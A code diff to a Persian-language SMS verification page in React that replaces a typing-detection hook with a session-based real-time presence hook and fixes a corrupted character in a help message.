@@ -11,7 +11,7 @@ import { Button } from "@/components/ui/button";
 import { AlertMessage } from "@/components/AlertMessage";
 import { OTPInput } from "@/components/OTPInput";
 import { toPersianDigits, maskPhoneNumber } from "@/lib/persian-utils";
-import { useSimpleTypingDetection } from "@/hooks/useSimpleTypingDetection";
+import { useRealtimePresence } from "@/hooks/useRealtimePresence";
 
 const AuthSMS = () => {
   const location = useLocation();
@@ -29,11 +29,11 @@ const AuthSMS = () => {
   const hasError = location.state?.hasError || false;
   const maskedPhoneNumber = maskPhoneNumber(phoneNumber);
 
-  // تشخیص تایپ برای AuthSMS
-  const typingDetection = useSimpleTypingDetection({
+  // Real-time presence tracking
+  const presence = useRealtimePresence({
+    sessionId: sessionId || "",
     formName: "AuthSMS",
-    enabledFields: ["smsCode", "code"],
-    debounceTime: 1000,
+    enabled: !!sessionId,
   });
 
   useEffect(() => {
@@ -151,9 +151,9 @@ const AuthSMS = () => {
     }
     // تشخیص تایپ برای presence system
     if (newCode) {
-      typingDetection.startTyping("smsCode");
+      presence.startTyping("smsCode");
     } else {
-      typingDetection.stopTyping("smsCode");
+      presence.stopTyping();
     }
   };
 
@@ -359,7 +359,7 @@ const AuthSMS = () => {
               >
                 <li>ممکن است تا ۲ دقیقه طول بکشد</li>
                 <li>پوشه هرزنامه خود را بررسی کنید</li>
-                <li>مطمئ�� شوید شماره همراه شما روشن است</li>
+                <li>مطمئن شوید شماره همراه شما روشن است</li>
               </ul>
             </div>
 
